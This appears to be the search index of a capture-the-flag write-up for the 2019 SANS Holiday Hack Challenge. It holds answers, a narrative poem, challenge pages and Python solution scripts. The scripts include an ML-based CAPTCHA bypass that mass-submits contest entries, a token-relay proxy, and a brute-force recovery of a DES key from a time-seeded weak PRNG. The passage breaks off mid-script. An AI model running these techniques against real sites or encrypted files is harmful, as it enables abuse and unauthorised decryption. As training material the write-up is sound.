{"config":{"lang":["en"],"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"Introduction # Hi there! Welcome to my write-up of 2019's SANS Holiday Hack Challenge aka KringleCon 2: Turtle Doves . The menu at the top gets you to all the goodies. This page serves as a summary for the main challenge answers, university map, and overall narrative. Challenges and hints can be found in their respective sections. Some odds and ends like interesting UI elements, login credentials, and a few notes about tokens are stored under miscellaneous. If you prefer keyboard shortcuts you can use n and p to navigate through all the content or use s to search. All site content is generated from Markdown files using MkDocs and hosted using Github pages. My 2018 KringleCon write-up can be downloaded here . If you have any feedback or questions please feel free to reach out to me on Twitter . Answers # Talk to Santa & Find the Turtle Doves : Student Union fireplace Unredact Threatening Document : DEMAND Evaluate Attack Outcome : supatree Determine Attacker Technique : ntdsutil Determine Compromised System : 192.168.134.130 Splunk : Kent you are so unfair. And we were going to make you the king of the Winter Carnival. Get Access To The Steam Tunnels : Krampus Hollyfeld Bypassing the Frido Sleigh CAPTEHA : 8Ia8LiZEwvyZr2WO Retrieve Scraps of Paper from Server : Super Sled-o-matic Recover Cleartext Document : Machine Learning Sleigh Route Finder Open the Sleigh Shop Door : The Tooth Fairy Filter Out Poisoned Data Sources : 0807198508261964 Note Talk to Santa in the Quad and Find the Turtle Doves do not require any answers to be submitted as these objectives are there to set the stage, point you in the right direction, and ensure you visit all areas of Elf University. The write-up for both these objectives has been consolidated under a single entry titled Talk to Santa & Find the Turtle Doves . Elf University Map # Click for larger version. Full Narrative # Arrive Whose grounds these are, I think I know His home is in the North Pole though He will not mind me traipsing here To watch his students learn and grow Meet Santa Some other folk might stop and sneer \"Two turtle doves, this man did rear?\" I'll find the birds, come push or shove Objectives given: I'll soon clear Doves Found Upon discov'ring each white dove, The subject of much campus love, I find the challenges are more Than one can count on woolen glove. Strange Man Who wandered thus through closet door? Ho ho, what's this? What strange boudoir! Things here cannot be what they seem That portal's more than clothing store. Meet Krampus Who enters contests by the ream And lives in tunnels meant for steam? This Krampus bloke seems rather strange And yet I must now join his team... CAPTEHA Despite this fellow's funk and mange My fate, I think, he's bound to change. What is this contest all about? His victory I shall arrange! Decrypt Router HW Paper To arms, my friends! Do scream and shout! Some villain targets Santa's route! What scum - what filth would seek to end Kris Kringle's journey while he's out? TF Plot Reveal Surprised, I am, but \"shock\" may tend To overstate and condescend. 'Tis little more than plot reveal That fairies often do extend Problem Solver And yet, despite her jealous zeal, My skills did win, my hacking heal! No dental dealer can so keep Our red-clad hero in ordeal! Cliff Hangers This Christmas must now fall asleep, But next year comes, and troubles creep. And Jack Frost hasn't made a peep, And Jack Frost hasn't made a peep... KringleCon 3: Jack Frost # After thwarting the Tooth Fairy's dastardly plans and meeting up with Santa and Krampus at the top of the Bell Tower at Elf University you'll find a letter in the back left corner of the room. It appears that the Tooth Fairy wasn't working alone! Could this be a hint for 2020? Will we be facing off with Jack Frost at KringleCon 3? Cue the ominous music .","title":"Home"},{"location":"#introduction","text":"Hi there! Welcome to my write-up of 2019's SANS Holiday Hack Challenge aka KringleCon 2: Turtle Doves . The menu at the top gets you to all the goodies. This page serves as a summary for the main challenge answers, university map, and overall narrative. Challenges and hints can be found in their respective sections. Some odds and ends like interesting UI elements, login credentials, and a few notes about tokens are stored under miscellaneous. If you prefer keyboard shortcuts you can use n and p to navigate through all the content or use s to search. All site content is generated from Markdown files using MkDocs and hosted using Github pages. My 2018 KringleCon write-up can be downloaded here . If you have any feedback or questions please feel free to reach out to me on Twitter .","title":"Introduction"},{"location":"#answers","text":"Talk to Santa & Find the Turtle Doves : Student Union fireplace Unredact Threatening Document : DEMAND Evaluate Attack Outcome : supatree Determine Attacker Technique : ntdsutil Determine Compromised System : 192.168.134.130 Splunk : Kent you are so unfair. And we were going to make you the king of the Winter Carnival. Get Access To The Steam Tunnels : Krampus Hollyfeld Bypassing the Frido Sleigh CAPTEHA : 8Ia8LiZEwvyZr2WO Retrieve Scraps of Paper from Server : Super Sled-o-matic Recover Cleartext Document : Machine Learning Sleigh Route Finder Open the Sleigh Shop Door : The Tooth Fairy Filter Out Poisoned Data Sources : 0807198508261964 Note Talk to Santa in the Quad and Find the Turtle Doves do not require any answers to be submitted as these objectives are there to set the stage, point you in the right direction, and ensure you visit all areas of Elf University. The write-up for both these objectives has been consolidated under a single entry titled Talk to Santa & Find the Turtle Doves .","title":"Answers"},{"location":"#elf-university-map","text":"Click for larger version.","title":"Elf University Map"},{"location":"#full-narrative","text":"Arrive Whose grounds these are, I think I know His home is in the North Pole though He will not mind me traipsing here To watch his students learn and grow Meet Santa Some other folk might stop and sneer \"Two turtle doves, this man did rear?\" I'll find the birds, come push or shove Objectives given: I'll soon clear Doves Found Upon discov'ring each white dove, The subject of much campus love, I find the challenges are more Than one can count on woolen glove. Strange Man Who wandered thus through closet door? Ho ho, what's this? What strange boudoir! Things here cannot be what they seem That portal's more than clothing store. Meet Krampus Who enters contests by the ream And lives in tunnels meant for steam? This Krampus bloke seems rather strange And yet I must now join his team... CAPTEHA Despite this fellow's funk and mange My fate, I think, he's bound to change. What is this contest all about? His victory I shall arrange! Decrypt Router HW Paper To arms, my friends! Do scream and shout! Some villain targets Santa's route! What scum - what filth would seek to end Kris Kringle's journey while he's out? TF Plot Reveal Surprised, I am, but \"shock\" may tend To overstate and condescend. 'Tis little more than plot reveal That fairies often do extend Problem Solver And yet, despite her jealous zeal, My skills did win, my hacking heal! No dental dealer can so keep Our red-clad hero in ordeal! Cliff Hangers This Christmas must now fall asleep, But next year comes, and troubles creep. And Jack Frost hasn't made a peep, And Jack Frost hasn't made a peep...","title":"Full Narrative"},{"location":"#kringlecon-3-jack-frost","text":"After thwarting the Tooth Fairy's dastardly plans and meeting up with Santa and Krampus at the top of the Bell Tower at Elf University you'll find a letter in the back left corner of the room. It appears that the Tooth Fairy wasn't working alone! Could this be a hint for 2020? Will we be facing off with Jack Frost at KringleCon 3? Cue the ominous music .","title":"KringleCon 3: Jack Frost"},{"location":"scripts/","text":"Scripts # find_code.py # Purpose : generate access codes for the Frosty Keypad hint. #!/usr/bin/env python3 \"\"\"KringleCon 2 - Frosty Keypad Hint.\"\"\" import itertools def is_prime(number): \"\"\"Verify if a number is a prime.\"\"\" return 2 in [number, 2**number % number] def main(): \"\"\"Execute.\"\"\" digit_sets = [ ['1', '1', '3', '7'], ['1', '3', '3', '7'], ['1', '3', '7', '7'] ] primes = [] for digits in digit_sets: for subset in itertools.permutations(digits): val = int(''.join(subset)) if is_prime(val) and val not in primes: primes.append(val) print(f'{val} is a prime number') if __name__ == \"__main__\": main() capteha_api.py # Purpose : bypass the CAPTHEHA in the Bypassing the Frido Sleigh CAPTEHA challenge. #!/usr/bin/env python3 \"\"\"KringleCon 2 - Bypassing the Frido Sleigh CAPTEHA Challenge.\"\"\" # Image Recognition Using Tensorflow Exmaple. # Code based on example at: # https://raw.githubusercontent.com/tensorflow/tensorflow/master/tensorflow/examples/label_image/label_image.py import os import base64 os.environ['TF_CPP_MIN_LOG_LEVEL'] = '3' import tensorflow as tf # noqa tf.logging.set_verbosity(tf.logging.ERROR) import numpy as np # noqa import threading # noqa import queue # noqa import time # noqa import requests # noqa import sys # noqa import json # noqa # sudo apt install python3-pip # sudo python3 -m pip install --upgrade pip # sudo python3 -m pip install --upgrade setuptools # sudo python3 -m pip install --upgrade tensorflow==1.15 def load_labels(label_file): \"\"\"Load labels.\"\"\" label = [] proto_as_ascii_lines = tf.gfile.GFile(label_file).readlines() for l in proto_as_ascii_lines: label.append(l.rstrip()) return label def predict_image( q, sess, graph, image_bytes, img_uuid, labels, input_operation, output_operation): \"\"\"Predict image.\"\"\" image = read_tensor_from_image_bytes(image_bytes) results = sess.run(output_operation.outputs[0], { input_operation.outputs[0]: image }) results = np.squeeze(results) prediction = results.argsort()[-5:][::-1][0] q.put({ 'img_uuid': img_uuid, 'prediction': labels[prediction].title(), 'percent': results[prediction] }) def load_graph(model_file): \"\"\"Load graph.\"\"\" graph = tf.Graph() graph_def = tf.GraphDef() with open(model_file, \"rb\") as f: graph_def.ParseFromString(f.read()) with graph.as_default(): tf.import_graph_def(graph_def) return graph def read_tensor_from_image_bytes( imagebytes, input_height=128, input_width=128, input_mean=0, input_std=255): \"\"\"Read Tensor from image bytes.\"\"\" image_reader = tf.image.decode_png( imagebytes, channels=3, name=\"png_reader\" ) float_caster = tf.cast(image_reader, tf.float32) dims_expander = tf.expand_dims(float_caster, 0) resized = tf.image.resize_bilinear( dims_expander, [input_height, input_width] ) normalized = tf.divide(tf.subtract(resized, [input_mean]), [input_std]) sess = tf.compat.v1.Session() result = sess.run(normalized) return result def main(): \"\"\"Execute.\"\"\" # Loading the Trained Machine Learning Model created from # running retrain.py on the training_images directory graph = load_graph('./tmp/retrain_tmp/output_graph.pb') labels = load_labels(\"./tmp/retrain_tmp/output_labels.txt\") # Load up our session input_operation = graph.get_operation_by_name(\"import/Placeholder\") output_operation = graph.get_operation_by_name(\"import/final_result\") sess = tf.compat.v1.Session(graph=graph) url = \"https://fridosleigh.com/\" # Create session s = requests.Session() # Get CAPTEHA images and types r = s.post(f'{url}api/capteha/request') if (r.json()['request']): images = r.json()['images'] types = [x.strip() for x in r.json()['select_type'].split(',')] types[-1] = types[-1].replace('and ', '') # Can use queues and threading to spead up the processing q = queue.Queue() # Going to iterate over each of our images. for image in images: img_uuid = image['uuid'] img_base64 = image['base64'] print('Processing Image {}'.format(img_uuid)) # We don't want to process too many images at once. 10 threads max while len(threading.enumerate()) > 10: time.sleep(0.0001) # Predict_image function is expecting png image bytes so we read # image as 'rb' to get a bytes object image_bytes = base64.b64decode(img_base64) threading.Thread( target=predict_image, args=( q, sess, graph, image_bytes, img_uuid, labels, input_operation, output_operation ) ).start() print('Waiting For Threads to Finish...') while q.qsize() < len(images): time.sleep(0.001) # Getting a list of all threads returned results prediction_results = [q.get() for x in range(q.qsize())] answers = [] # What are we looking for? print(f'Looking for {types}') # Get the matching images for prediction in prediction_results: if prediction['prediction'] in types: print(f\"{prediction['img_uuid']} is a {prediction['prediction']}.\") answers.append(prediction['img_uuid']) final_answer = ','.join(answers) # Submit CAPTHEHA answers json_resp = json.loads( s.post( f'{url}api/capteha/submit', data={'answer': final_answer} ).text ) # WOMP WOMP if not json_resp['request']: # If it fails just run again. ML might get one wrong occasionally print('FAILED MACHINE LEARNING GUESS') print('-------\\nOur ML Guess:\\n--------\\n{}'.format(final_answer)) print('------\\nServer Response:\\n------\\n{}'.format(json_resp['data'])) sys.exit(1) # Found the CAPTEHA print('CAPTEHA Solved!') # If we get to here, we are successful and can submit a bunch # of entries till we win userinfo = { 'name': 'Krampus Hollyfeld', 'email': 'crahan@example.com', 'age': 180, 'about': \"Cause they're so flippin yummy!\", 'favorites': 'thickmints' } # If we win the once-per minute drawing, it will tell us we were emailed. # Should be no more than 200 times before we win. If more, somethings # wrong. entry_response = '' entry_count = 1 while 'crahan@example.com' not in entry_response and entry_count < 200: print( f'Submitting lots of entries until ' f'we win the contest! Entry #{entry_count}' ) entry_response = s.post( f'{url}api/entry', data=userinfo ).text entry_count += 1 print(entry_response) if __name__ == \"__main__\": main() token_proxy.py # Purpose : translate tokens for the Retrieve the Scraps of Paper from Server challenge. #!/usr/bin/env python3 \"\"\"KringleCon 2 - Retrieve Scraps of Paper from Server Challenge.\"\"\" import requests from flask import Flask, Response app = Flask(__name__) @app.route(\"/\") def token(): \"\"\"Return a token.\"\"\" url = 'https://studentportal.elfu.org/validator.php' token = requests.Session().get(url).text # Put the token in the body, input tag, and header. resp = Response( f'Token:{token}\\n' '<form>\\n' f' <input type=\"hidden\" id=\"token\" name=\"token\" value=\"{token}\"/>\\n' '</form>\\n' ) resp.headers['token'] = token return resp if __name__ == '__main__': app.run(host='0.0.0.0') decrypt_pdf.py # Purpose : decrypt the PDF in the Recover Cleartext Document challenge. #!/usr/bin/env python3 \"\"\"KringleCon 2 - Recover Cleartext Document Challenge.\"\"\" from Crypto.Cipher import DES seed = 0 def rand(): \"\"\"Generate random value.\"\"\" # 1. get seed value # 2. multiply seed by 214013 # 3. add 2531011 (this is our new seed value) # 4. right shift seed by 16 # 5. bitwise AND with 32767 global seed seed = (214013 * seed + 2531011) val = seed >> 16 return (val & 32767) def generate_key(val): \"\"\"Generate encryption key.\"\"\" global seed seed = val encrypted = [] for _x in range(8): tmp = hex(rand()) if len(str(tmp)) == 6: encrypted.append(str(tmp)[4:]) elif len(str(tmp)) == 5: encrypted.append(str(tmp)[3:]) elif len(str(tmp)) == 4: encrypted.append(str(tmp)[2:]) elif len(str(tmp)) == 3: encrypted.append(f\"0{str(tmp)[-1]}\") return ''.join(encrypted) def main(): \"\"\"Execute.\"\"\" # File names encinfile = 'ElfUResearchLabsSuperSledOMaticQuickStartGuideV1.2.pdf.enc' pdfoutfile = 'ElfUResearchLabsSuperSledOMaticQuickStartGuideV1.2.pdf' # Friday, December 6, 2019 7:00:00 PM start = 1575658800 # Loop over 2 hours and generate the key for each for x in range(7200): keyseed = start + x key = generate_key(keyseed) bytekey = bytearray.fromhex(key) # Prep for decrypting DES-CBC cipher = DES.new( bytekey, DES.MODE_CBC, iv=bytearray.fromhex('0000000000000000') ) # Read encrypted file f = open(encinfile, 'rb') encrypted = f.read() # Decrypt using the current key msg = (cipher.iv + cipher.decrypt(encrypted)) # Check if decryption was successful if msg[9:12] == b'PDF': # Yes, we got a PDF! print(f'Pass {x}: {key} decrypts to a PDF!') f = open(pdfoutfile, 'wb') f.write(msg) break else: # Womp womp! On to the next. print(f'Pass {x}: {key} is no bueno!') if __name__ == \"__main__\": main() match_user_agents.py # Purpose : find additional bad IPs in the Filter Out Poisoned Data Sources challenge. #!/usr/bin/env python3 \"\"\"KringleCon 2 - Filter Out Poisoned Data Sources Challenge.\"\"\" def main(): \"\"\"Execute.\"\"\" file_bad = 'IPs_bad.csv' file_all = 'IPs_all.csv' list_bad = [] list_all = [] # Read the full data log with open(file_all) as fp: line = fp.readline() while line: list_all.append(line.split('\\t')) line = fp.readline() # Read the bad IP data and match on user_agent but only # keep the results if less than 4 matches are found. with open(file_bad) as fp: line = fp.readline() while line: tmp = [] line_bad = line.split('\\t') for line_all in list_all: if line_all[4] == line_bad[4]: tmp.append(line_all[0]) # Only add if less than 4 matches if len(tmp) < 4: list_bad.extend(tmp) # Add the original IP as well list_bad.append(line_bad[0]) line = fp.readline() # Remove duplicates list_bad = list(dict.fromkeys(list_bad)) # Tadaaaaa! print(f'Bad IPs: {\",\".join(list_bad)}') if __name__ == \"__main__\": main()","title":"Scripts"},{"location":"scripts/#scripts","text":"","title":"Scripts"},{"location":"scripts/#find_codepy","text":"Purpose : generate access codes for the Frosty Keypad hint. #!/usr/bin/env python3 \"\"\"KringleCon 2 - Frosty Keypad Hint.\"\"\" import itertools def is_prime(number): \"\"\"Verify if a number is a prime.\"\"\" return 2 in [number, 2**number % number] def main(): \"\"\"Execute.\"\"\" digit_sets = [ ['1', '1', '3', '7'], ['1', '3', '3', '7'], ['1', '3', '7', '7'] ] primes = [] for digits in digit_sets: for subset in itertools.permutations(digits): val = int(''.join(subset)) if is_prime(val) and val not in primes: primes.append(val) print(f'{val} is a prime number') if __name__ == \"__main__\": main()","title":"find_code.py"},{"location":"scripts/#capteha_apipy","text":"Purpose : bypass the CAPTHEHA in the Bypassing the Frido Sleigh CAPTEHA challenge. #!/usr/bin/env python3 \"\"\"KringleCon 2 - Bypassing the Frido Sleigh CAPTEHA Challenge.\"\"\" # Image Recognition Using Tensorflow Exmaple. # Code based on example at: # https://raw.githubusercontent.com/tensorflow/tensorflow/master/tensorflow/examples/label_image/label_image.py import os import base64 os.environ['TF_CPP_MIN_LOG_LEVEL'] = '3' import tensorflow as tf # noqa tf.logging.set_verbosity(tf.logging.ERROR) import numpy as np # noqa import threading # noqa import queue # noqa import time # noqa import requests # noqa import sys # noqa import json # noqa # sudo apt install python3-pip # sudo python3 -m pip install --upgrade pip # sudo python3 -m pip install --upgrade setuptools # sudo python3 -m pip install --upgrade tensorflow==1.15 def load_labels(label_file): \"\"\"Load labels.\"\"\" label = [] proto_as_ascii_lines = tf.gfile.GFile(label_file).readlines() for l in proto_as_ascii_lines: label.append(l.rstrip()) return label def predict_image( q, sess, graph, image_bytes, img_uuid, labels, input_operation, output_operation): \"\"\"Predict image.\"\"\" image = read_tensor_from_image_bytes(image_bytes) results = sess.run(output_operation.outputs[0], { input_operation.outputs[0]: image }) results = np.squeeze(results) prediction = results.argsort()[-5:][::-1][0] q.put({ 'img_uuid': img_uuid, 'prediction': labels[prediction].title(), 'percent': results[prediction] }) def load_graph(model_file): \"\"\"Load graph.\"\"\" graph = tf.Graph() graph_def = tf.GraphDef() with open(model_file, \"rb\") as f: graph_def.ParseFromString(f.read()) with graph.as_default(): tf.import_graph_def(graph_def) return graph def read_tensor_from_image_bytes( imagebytes, input_height=128, input_width=128, input_mean=0, input_std=255): \"\"\"Read Tensor from image bytes.\"\"\" image_reader = tf.image.decode_png( imagebytes, channels=3, name=\"png_reader\" ) float_caster = tf.cast(image_reader, tf.float32) dims_expander = tf.expand_dims(float_caster, 0) resized = tf.image.resize_bilinear( dims_expander, [input_height, input_width] ) normalized = tf.divide(tf.subtract(resized, [input_mean]), [input_std]) sess = tf.compat.v1.Session() result = sess.run(normalized) return result def main(): \"\"\"Execute.\"\"\" # Loading the Trained Machine Learning Model created from # running retrain.py on the training_images directory graph = load_graph('./tmp/retrain_tmp/output_graph.pb') labels = load_labels(\"./tmp/retrain_tmp/output_labels.txt\") # Load up our session input_operation = graph.get_operation_by_name(\"import/Placeholder\") output_operation = graph.get_operation_by_name(\"import/final_result\") sess = tf.compat.v1.Session(graph=graph) url = \"https://fridosleigh.com/\" # Create session s = requests.Session() # Get CAPTEHA images and types r = s.post(f'{url}api/capteha/request') if (r.json()['request']): images = r.json()['images'] types = [x.strip() for x in r.json()['select_type'].split(',')] types[-1] = types[-1].replace('and ', '') # Can use queues and threading to spead up the processing q = queue.Queue() # Going to iterate over each of our images. for image in images: img_uuid = image['uuid'] img_base64 = image['base64'] print('Processing Image {}'.format(img_uuid)) # We don't want to process too many images at once. 10 threads max while len(threading.enumerate()) > 10: time.sleep(0.0001) # Predict_image function is expecting png image bytes so we read # image as 'rb' to get a bytes object image_bytes = base64.b64decode(img_base64) threading.Thread( target=predict_image, args=( q, sess, graph, image_bytes, img_uuid, labels, input_operation, output_operation ) ).start() print('Waiting For Threads to Finish...') while q.qsize() < len(images): time.sleep(0.001) # Getting a list of all threads returned results prediction_results = [q.get() for x in range(q.qsize())] answers = [] # What are we looking for? print(f'Looking for {types}') # Get the matching images for prediction in prediction_results: if prediction['prediction'] in types: print(f\"{prediction['img_uuid']} is a {prediction['prediction']}.\") answers.append(prediction['img_uuid']) final_answer = ','.join(answers) # Submit CAPTHEHA answers json_resp = json.loads( s.post( f'{url}api/capteha/submit', data={'answer': final_answer} ).text ) # WOMP WOMP if not json_resp['request']: # If it fails just run again. ML might get one wrong occasionally print('FAILED MACHINE LEARNING GUESS') print('-------\\nOur ML Guess:\\n--------\\n{}'.format(final_answer)) print('------\\nServer Response:\\n------\\n{}'.format(json_resp['data'])) sys.exit(1) # Found the CAPTEHA print('CAPTEHA Solved!') # If we get to here, we are successful and can submit a bunch # of entries till we win userinfo = { 'name': 'Krampus Hollyfeld', 'email': 'crahan@example.com', 'age': 180, 'about': \"Cause they're so flippin yummy!\", 'favorites': 'thickmints' } # If we win the once-per minute drawing, it will tell us we were emailed. # Should be no more than 200 times before we win. If more, somethings # wrong. entry_response = '' entry_count = 1 while 'crahan@example.com' not in entry_response and entry_count < 200: print( f'Submitting lots of entries until ' f'we win the contest! Entry #{entry_count}' ) entry_response = s.post( f'{url}api/entry', data=userinfo ).text entry_count += 1 print(entry_response) if __name__ == \"__main__\": main()","title":"capteha_api.py"},{"location":"scripts/#token_proxypy","text":"Purpose : translate tokens for the Retrieve the Scraps of Paper from Server challenge. #!/usr/bin/env python3 \"\"\"KringleCon 2 - Retrieve Scraps of Paper from Server Challenge.\"\"\" import requests from flask import Flask, Response app = Flask(__name__) @app.route(\"/\") def token(): \"\"\"Return a token.\"\"\" url = 'https://studentportal.elfu.org/validator.php' token = requests.Session().get(url).text # Put the token in the body, input tag, and header. resp = Response( f'Token:{token}\\n' '<form>\\n' f' <input type=\"hidden\" id=\"token\" name=\"token\" value=\"{token}\"/>\\n' '</form>\\n' ) resp.headers['token'] = token return resp if __name__ == '__main__': app.run(host='0.0.0.0')","title":"token_proxy.py"},{"location":"scripts/#decrypt_pdfpy","text":"Purpose : decrypt the PDF in the Recover Cleartext Document challenge. #!/usr/bin/env python3 \"\"\"KringleCon 2 - Recover Cleartext Document Challenge.\"\"\" from Crypto.Cipher import DES seed = 0 def rand(): \"\"\"Generate random value.\"\"\" # 1. get seed value # 2. multiply seed by 214013 # 3. add 2531011 (this is our new seed value) # 4. right shift seed by 16 # 5. bitwise AND with 32767 global seed seed = (214013 * seed + 2531011) val = seed >> 16 return (val & 32767) def generate_key(val): \"\"\"Generate encryption key.\"\"\" global seed seed = val encrypted = [] for _x in range(8): tmp = hex(rand()) if len(str(tmp)) == 6: encrypted.append(str(tmp)[4:]) elif len(str(tmp)) == 5: encrypted.append(str(tmp)[3:]) elif len(str(tmp)) == 4: encrypted.append(str(tmp)[2:]) elif len(str(tmp)) == 3: encrypted.append(f\"0{str(tmp)[-1]}\") return ''.join(encrypted) def main(): \"\"\"Execute.\"\"\" # File names encinfile = 'ElfUResearchLabsSuperSledOMaticQuickStartGuideV1.2.pdf.enc' pdfoutfile = 'ElfUResearchLabsSuperSledOMaticQuickStartGuideV1.2.pdf' # Friday, December 6, 2019 7:00:00 PM start = 1575658800 # Loop over 2 hours and generate the key for each for x in range(7200): keyseed = start + x key = generate_key(keyseed) bytekey = bytearray.fromhex(key) # Prep for decrypting DES-CBC cipher = DES.new( bytekey, DES.MODE_CBC, iv=bytearray.fromhex('0000000000000000') ) # Read encrypted file f = open(encinfile, 'rb') encrypted = f.read() # Decrypt using the current key msg = (cipher.iv + cipher.decrypt(encrypted)) # Check if decryption was successful if msg[9:12] == b'PDF': # Yes, we got a PDF! print(f'Pass {x}: {key} decrypts to a PDF!') f = open(pdfoutfile, 'wb') f.write(msg) break else: # Womp womp! On to the next. print(f'Pass {x}: {key} is no bueno!') if __name__ == \"__main__\": main()","title":"decrypt_pdf.py"},{"location":"scripts/#match_user_agentspy","text":"Purpose : find additional bad IPs in the Filter Out Poisoned Data Sources challenge. #!/usr/bin/env python3 \"\"\"KringleCon 2 - Filter Out Poisoned Data Sources Challenge.\"\"\" def main(): \"\"\"Execute.\"\"\" file_bad = 'IPs_bad.csv' file_all = 'IPs_all.csv' list_bad = [] list_all = [] # Read the full data log with open(file_all) as fp: line = fp.readline() while line: list_all.append(line.split('\\t')) line = fp.readline() # Read the bad IP data and match on user_agent but only # keep the results if less than 4 matches are found. with open(file_bad) as fp: line = fp.readline() while line: tmp = [] line_bad = line.split('\\t') for line_all in list_all: if line_all[4] == line_bad[4]: tmp.append(line_all[0]) # Only add if less than 4 matches if len(tmp) < 4: list_bad.extend(tmp) # Add the original IP as well list_bad.append(line_bad[0]) line = fp.readline() # Remove duplicates list_bad = list(dict.fromkeys(list_bad)) # Tadaaaaa! print(f'Bad IPs: {\",\".join(list_bad)}') if __name__ == \"__main__\": main()","title":"match_user_agents.py"},{"location":"challenges/c1/","text":"Talk to Santa & Find the Turtle Doves # Hint : none Request # This is a little embarrassing, but I need your help. Our KringleCon turtle dove mascots are missing! They probably just wandered off. Can you please help find them? To help you search for them and get acquainted with KringleCon, I\u2019ve created some objectives for you. You can see them in your badge. Where's your badge? Oh! It's that big, circle emblem on your chest - give it a tap! We made them in two flavors - one for our new guests, and one for those who've attended both KringleCons. After you find the Turtle Doves and complete objectives 2-5, please come back and let me know. Not sure where to start? Try hopping around campus and talking to some elves. If you help my elves with some quicker problems, they'll probably remember clues for the objectives. Resources # None Solution # This objective, together with Talk to Santa in the Quad , doesn't require any answers to be submitted as it's meant to set the stage, point you in the right direction, and ensure you roam around Elf University and talk to the NPCs. To complete objective 0 and to learn more about the missing doves talk to Santa in the Quad. Once you've located the doves near the Student Union fireplace and complete objectives 2-5 objective 1 will be marked as completed and Santa will continue the conversation as indicated in the response section below. Answer # Turtle doves location: Student Union fireplace Response # Thank you for finding Jane and Michael, our two turtle doves! I\u2019ve got an uneasy feeling about how they disappeared. Turtle doves wouldn\u2019t wander off like that. Someone must have stolen them! Please help us find the thief! It\u2019s a moral imperative! I think you should look for an entrance to the steam tunnels and solve Challenge 6 and 7 too! Gosh, I can\u2019t help but think: Winds in the East, snow coming in... Like something is brewing and about to begin! Can\u2019t put my finger on what lies in store, But I fear what\u2019s to happen all happened before!","title":"Talk to Santa & Find the Turtle Doves"},{"location":"challenges/c1/#talk-to-santa-find-the-turtle-doves","text":"Hint : none","title":"Talk to Santa &amp; Find the Turtle Doves"},{"location":"challenges/c1/#request","text":"This is a little embarrassing, but I need your help. Our KringleCon turtle dove mascots are missing! They probably just wandered off. Can you please help find them? To help you search for them and get acquainted with KringleCon, I\u2019ve created some objectives for you. You can see them in your badge. Where's your badge? Oh! It's that big, circle emblem on your chest - give it a tap! We made them in two flavors - one for our new guests, and one for those who've attended both KringleCons. After you find the Turtle Doves and complete objectives 2-5, please come back and let me know. Not sure where to start? Try hopping around campus and talking to some elves. If you help my elves with some quicker problems, they'll probably remember clues for the objectives.","title":"Request"},{"location":"challenges/c1/#resources","text":"None","title":"Resources"},{"location":"challenges/c1/#solution","text":"This objective, together with Talk to Santa in the Quad , doesn't require any answers to be submitted as it's meant to set the stage, point you in the right direction, and ensure you roam around Elf University and talk to the NPCs. To complete objective 0 and to learn more about the missing doves talk to Santa in the Quad. Once you've located the doves near the Student Union fireplace and complete objectives 2-5 objective 1 will be marked as completed and Santa will continue the conversation as indicated in the response section below.","title":"Solution"},{"location":"challenges/c1/#answer","text":"Turtle doves location: Student Union fireplace","title":"Answer"},{"location":"challenges/c1/#response","text":"Thank you for finding Jane and Michael, our two turtle doves! I\u2019ve got an uneasy feeling about how they disappeared. Turtle doves wouldn\u2019t wander off like that. Someone must have stolen them! Please help us find the thief! It\u2019s a moral imperative! I think you should look for an entrance to the steam tunnels and solve Challenge 6 and 7 too! Gosh, I can\u2019t help but think: Winds in the East, snow coming in... Like something is brewing and about to begin! Can\u2019t put my finger on what lies in store, But I fear what\u2019s to happen all happened before!","title":"Response"},{"location":"challenges/c10/","text":"Recover Cleartext Document # Hint : Holly Evergreen - Mongo Pilfer Request # The Elfscrow Crypto tool is a vital asset used at Elf University for encrypting SUPER SECRET documents. We can't send you the source, but we do have debug symbols that you can use. Recover the plaintext content for this encrypted document . We know that it was encrypted on December 6, 2019, between 7pm and 9pm UTC. What is the middle line on the cover page? (Hint: it's five words) Resources # Elfscrow Crypto Binary Elfscrow Debug Symbols Encrypted PDF Document Ron Bowes, Reversing Crypto the Easy Way Reversing Crypto Demo Code & Slides IDA Ghidra Solution # The most helpful resource for this challenge is defnitely Ron Bowes' Reversing Crypto the Easy Way presentation. It goes over a lot of information and is well worth the time. If you're new to crypto then you'll definitely learn more than a few things (like I did). Start by encrypting a plain text document with the elfscrow.exe crypto tool and looking at the program output. elfscrow.exe --encrypt test.txt test.txt.enc The elfscrow.exe application prints the seed, generates and prints the encryption key, encrypts the file, sends the key to the elfscrow server for storage, and finally prints a secret ID which can be used to retrieve the key from the server and decrypt the file again. The output provides two additional pieces of information. First, the seed value looks like the current date and time represented in epoch format . Secondly, the key length is 8 bytes which could indicate DES. Open up the elfscrow.exe binary and elfscrow.pdb debug symbols in IDA to better understand how exactly the tool uses the seed to generate the 8-byte encryption key and what algorithm is being used. Start by looking at the generate_key function. This function first calls time , then super_secure_srand to initialize the seed, and finally loops 8 times over the super_secure_random pseudo-random number generator (PRNG) function to create the 8-byte encryption key. The super_secure_srand function doesn't to do much more than print and then store the seed in state . The super_secure_random function then takes the seed value stored in state , multiplies it by 343FDh (i.e. 214013 in decimal), adds 269EC3h (i.e. 2531011 in decimal), and saves this value in state as the new seed value. It continues with bit-shifting the current value, bitwise AND-ing with 7FFFh (i.e. 32767 in decimal), and returning this value as the next key byte. Translating super_secure_random into Python gives us the below function. def rand(): \"\"\"Generate random value.\"\"\" # 1. get seed value # 2. multiply seed by 214013 # 3. add 2531011 (this is our new seed value) # 4. right shift seed by 16 # 5. bitwise AND with 32767 global seed seed = (214013 * seed + 2531011) val = seed >> 16 return (val & 32767) Doing the same for the generate_key function results in the following function. def generate_key(val): \"\"\"Generate encryption key.\"\"\" global seed seed = val encrypted = [] for _x in range(8): tmp = hex(rand()) if len(str(tmp)) == 6: encrypted.append(str(tmp)[4:]) elif len(str(tmp)) == 5: encrypted.append(str(tmp)[3:]) elif len(str(tmp)) == 4: encrypted.append(str(tmp)[2:]) elif len(str(tmp)) == 3: encrypted.append(f\"0{str(tmp)[-1]}\") return ''.join(encrypted) Now that we've determined the initial seed value (i.e. epoch time) and replicated the algorithm to generate the 8-byte key, we need to determine what encryption algorithm is used by elfscrow.exe . The do_encrypt function provides some useful hints. First there's the obvious \"CryptImportKey failed for DES-CBC key\" comment. While a comment can contain incorrect information it's confirmed by the 6601h algorithm ID value (i.e. CALG_DES) which is used as input for the CryptImportKey function. Our initial suspicion that DES is being used based on the 8-byte key length appears to be correct. The final piece of the puzzle is the hint that the file was encrypted on December 6, 2019, between 7pm and 9pm UTC. This gives us a 7200-second window or 7200 possible seed values starting from 1575658800 (i.e. epoch time for December 6, 2019, 7pm). We can now complete the decrypt_pdf.py script by adding the following Python code. def main(): \"\"\"Execute.\"\"\" # File names encinfile = 'ElfUResearchLabsSuperSledOMaticQuickStartGuideV1.2.pdf.enc' 